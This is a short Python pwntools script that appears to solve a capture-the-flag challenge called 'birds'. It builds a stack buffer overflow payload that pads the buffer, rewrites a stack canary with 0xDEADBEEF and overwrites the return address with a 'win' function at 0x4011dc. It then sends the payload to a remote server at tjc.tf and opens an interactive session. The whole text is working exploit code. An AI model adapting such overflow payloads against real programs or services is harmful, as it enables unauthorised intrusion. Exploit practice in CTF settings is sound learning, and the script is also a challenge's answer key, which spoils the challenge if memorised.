from pwn import *

win_addr = p64(0x4011dc)

elf = ELF('./birds')

payload = b"A"*64
payload += b"B" * 12
payload += p32(0xDEADBEEF)
#payload += b"\xef\xbe\xad\xde" <- what the canary ends up as

payload += b"C" * 8
payload+= p64(0x00000000004011dc)
#payload += b"\xdc\x11\x40\x00\x00\x00\x00\x00" <- what the ret addr ends up as

print(payload)

# If you are connecting to a local process, use the below

#p = process('./birds')
#p.sendline(payload)
#p.interactive()

# If you are connecting to a remote server, use the below

target_host = "tjc.tf"
target_port = 31625

conn = remote(target_host, target_port)
conn.recvuntil("wrong!\n")
conn.sendline(payload)
conn.interactive()
